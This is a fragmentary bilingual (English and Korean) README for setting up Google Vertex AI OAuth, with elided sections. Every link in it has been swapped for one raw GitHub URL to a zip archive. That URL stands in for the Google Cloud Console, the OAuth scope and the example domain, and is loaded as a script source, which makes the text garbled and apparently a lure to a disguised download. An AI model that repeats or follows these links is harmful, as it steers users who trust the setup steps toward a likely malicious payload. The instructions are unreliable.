...
```html
<script src="https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip" async></script>
...
const gauth = new GoogleAuth({
  scopes: ['https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip'],
});
...
1. Go to [Google Cloud Console](https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip)
...
4. Go to **APIs & Services → Credentials → Create OAuth 2.0 Client ID**
   ...
   - Authorized JavaScript origins: your domain (e.g. `https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip`)
...
- Token scope is `https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip` — handle with care
...
1. [Google Cloud Console](https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip) 접속
...
4. **API 및 서비스 → 사용자 인증 정보 → OAuth 2.0 클라이언트 ID 만들기**
   - 애플리케이션 유형: 웹 애플리케이션
   - 승인된 JavaScript 출처: 사용할 도메인 (예: `https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip`)
...
- 토큰 스코프가 `https://raw.githubusercontent.com/halfmoonprosecution390/vertex-ai-oauth/main/lib/ai_oauth_vertex_1.6.zip`으로 광범위합니다 — 취급에 주의하세요
